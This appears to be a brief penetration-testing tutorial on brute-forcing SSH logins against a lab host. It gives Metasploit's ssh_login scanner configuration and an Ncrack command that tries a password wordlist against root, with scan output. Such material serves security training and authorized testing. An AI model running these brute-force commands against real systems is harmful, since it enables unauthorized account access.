🔐 SSH Enumeration & Brute Force (Metasploit + Ncrack)

🖥️ Launching Metasploit

msfconsole


💡 Tip: Export database results

db_export -f xml


🔍 Searching for SSH Modules

search ssh login


📦 Matching Modules (Relevant)

#	Module	Description

1	auxiliary/scanner/ssh/apache_karaf_command_execution	Default creds RCE

2	auxiliary/scanner/ssh/karaf_login	Login utility

4	auxiliary/scanner/ssh/cerberus_sftp_enumusers	Username enumeration

13	auxiliary/scanner/ssh/ssh_login	🔥 SSH brute-force scanner


⚙️ Using SSH Login Scanner

use auxiliary/scanner/ssh/ssh_login


📋 Module Options

options


🔑 Important Parameters

Option	Description

RHOSTS	Target IP

RPORT	Default SSH port (22)

USERNAME	Username (default: root)

PASS_FILE	Password wordlist

THREADS	Number of parallel attempts

VERBOSE	Show all attempts


🎯 Configuration

set rhosts 192.168.232.129

set threads 10

set verbose true


▶️ Run the Scan

run


⚠️ Important Note

Ncrack supports legacy SSH encryption, while Hydra may fail due to modern crypto restrictions.


🚀 Alternative Tool: Ncrack

ncrack -v -p 22 --user root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.232.129


📊 Output Summary

Starting Ncrack 0.7 at 2026-04-30 15:52 EDT


ssh://192.168.232.129:22 finished.


Ncrack done: 1 service scanned in 279.70 seconds.

Probes sent: 304 | timed-out: 0 | prematurely-closed: 172


Ncrack finished.
